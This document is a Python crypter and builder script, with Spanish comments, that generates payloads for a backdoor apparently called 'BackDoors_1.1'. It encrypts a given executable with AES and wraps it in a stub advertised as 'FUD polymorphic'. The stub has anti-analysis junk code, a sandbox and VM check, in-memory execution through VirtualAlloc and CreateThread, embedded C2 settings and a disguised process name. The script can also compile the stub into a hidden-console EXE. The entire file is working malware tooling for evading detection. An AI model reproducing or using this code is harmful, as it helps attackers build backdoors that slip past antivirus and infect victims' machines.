#!/usr/bin/env python3
"""
generador_payloads.py — Generador profesional de payloads para BackDoors_1.1

Permite crear payloads personalizados (EXE/PY) listos para pentesting, con:
- C2/clave/nombre configurados al vuelo
- Cifrado fuerte (AES)
- Stub polimórfico con code junk y anti-VM
- Generación de .py y .exe (PyInstaller)
- Reporte final del payload generado
"""

import os
import sys
import secrets
import base64
import shutil
import subprocess
import argparse
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad

BUILDER_STUB = """
# --- Stub Crypter FUD Polymorphic by WodeN-4ever ---
import base64
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad
import sys
import ctypes
import struct
import threading

# --- Junk/anti-análisis ---
_junk = bytearray([i ^ 0x55 for i in range(1536)])
def _polymorph(): return sum([b for b in _junk])
def _dummy(): return ''.join([chr((i%26)+97) for i in _junk[:128]])
_polymorph(); _dummy()
# --- End Junk ---

C2_HOST = "{c2_host}"
C2_PORT = {c2_port}
C2_KEY  = "{c2_key}"
PROC_NAME = "{proc_name}"

payload_enc = \"\"\"{payload_enc}\"\"\"
key = base64.b64decode("{key_b64}")

def anti_vm():
    names = ['vbox', 'vmware', 'xen', 'qemu', 'virtual', 'sandbox']
    import os
    for proc in os.popen('tasklist').read().lower().split():
        if any(vm in proc for vm in names):
            sys.exit(0)
anti_vm()

def descifrar_payload():
    ct = base64.b64decode(payload_enc)
    iv, data = ct[:16], ct[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    bin_data = unpad(cipher.decrypt(data), AES.block_size)
    return bin_data

def runpe(payload):
    from ctypes import wintypes
    kernel32 = ctypes.windll.kernel32
    size = len(payload)
    ptr = kernel32.VirtualAlloc(None, size, 0x3000, 0x40)
    ctypes.memmove(ptr, payload, size)
    hThread = kernel32.CreateThread(None, 0, ptr, None, 0, None)
    kernel32.WaitForSingleObject(hThread, -1)

def main():
    bin_data = descifrar_payload()
    t = threading.Thread(target=runpe, args=(bin_data,))
    t.start()
    t.join()

if __name__ == "__main__":
    try: main()
    except: pass
"""

def cifrar_payload(payload_bytes, key):
    iv = secrets.token_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct = cipher.encrypt(pad(payload_bytes, AES.block_size))
    return base64.b64encode(iv + ct)

def generar_stub(payload_path, output_py, c2_host, c2_port, c2_key, proc_name):
    with open(payload_path, "rb") as f:
        payload = f.read()
    key = secrets.token_bytes(32)
    payload_enc = cifrar_payload(payload, key).decode()
    key_b64 = base64.b64encode(key).decode()
    stub_code = BUILDER_STUB.format(
        c2_host=c2_host,
        c2_port=c2_port,
        c2_key=c2_key,
        proc_name=proc_name,
        payload_enc=payload_enc,
        key_b64=key_b64
    )
    with open(output_py, "w", encoding="utf-8") as f:
        f.write(stub_code)

def compilar_py_to_exe(py_path, proc_name):
    cmd = [
        "pyinstaller", "--onefile", "--noconsole", "--name", proc_name,
        py_path
    ]
    subprocess.run(cmd)
    dist_path = os.path.join("dist", f"{proc_name}.exe")
    if os.path.exists(dist_path):
        shutil.move(dist_path, os.path.abspath(f"./{proc_name}.exe"))
        print(f"[+] Payload EXE generado: {proc_name}.exe")
    else:
        print("[-] No se encontró el ejecutable final en dist/")

def main():
    parser = argparse.ArgumentParser(
        description="Generador de payloads polimórficos para BackDoors_1.1"
    )
    parser.add_argument("-i", "--input", required=True, help="Ruta al payload base (.exe)")
    parser.add_argument("-o", "--output", required=True, help="Archivo de stub de salida (.py)")
    parser.add_argument("--c2host", required=True, help="C2 Host/IP del server")
    parser.add_argument("--c2port", type=int, required=True, help="C2 Puerto")
    parser.add_argument("--key", default="ofuscaEstaClaveYa", help="Clave secreta para C2")
    parser.add_argument("--procname", default="sysdrv", help="Nombre del proceso/binario")
    parser.add_argument("--exe", action="store_true", help="Compilar a EXE automáticamente")
    args = parser.parse_args()

    print("[*] Generando stub personalizado y polimórfico...")
    generar_stub(args.input, args.output, args.c2host, args.c2port, args.key, args.procname)
    print(f"[+] Stub listo: {args.output}")
    if args.exe:
        print("[*] Compilando a EXE con PyInstaller...")
        compilar_py_to_exe(args.output, args.procname)

    print("========== RESUMEN ==========")
    print(f"Payload base: {args.input}")
    print(f"Stub generado: {args.output}")
    print(f"C2: {args.c2host}:{args.c2port}")
    print(f"Clave: {args.key}")
    print(f"Nombre binario: {args.procname}")
    if args.exe:
        print(f"Payload final: {args.procname}.exe")
    print("=============================")

if __name__ == "__main__":
    main()
